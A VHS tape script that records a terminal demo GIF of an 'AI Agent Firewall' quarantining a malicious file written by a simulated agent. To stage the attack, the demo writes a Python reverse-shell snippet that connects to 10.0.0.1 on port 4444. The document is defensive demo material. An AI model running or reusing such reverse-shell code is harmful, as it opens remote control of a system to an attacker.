# AI Agent Firewall - Automated Terminal GIF Generator
# Requirements: brew install vhs
# Usage: vhs demo.tape

Output demo.gif

Set Shell "zsh"
Set FontSize 14
Set FontFamily "JetBrains Mono"
Set Width 1100
Set Height 680
Set Padding 20
Set Theme "Catppuccin Mocha"
Set WindowBar "Colorful"
Set BorderRadius 12
Set TypingSpeed 50ms

# 1. Start the firewall inspector
Type "aaf watch"
Sleep 400ms
Enter
Sleep 3s

# 2. Simulate agent write interception
Type "# In another process: Agent attempts reverse shell backdoor..."
Sleep 1s
Enter
Type "echo 'import socket,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)' > attack.py"
Sleep 300ms
Enter
Sleep 4s

# 3. Verify quarantine neutralization
Type "cat attack.py"
Sleep 300ms
Enter
Sleep 3s

# 4. Show isolated threat in vault
Type "cat .firewall-quarantine/attack.py.*.quarantine"
Sleep 300ms
Enter
Sleep 4s
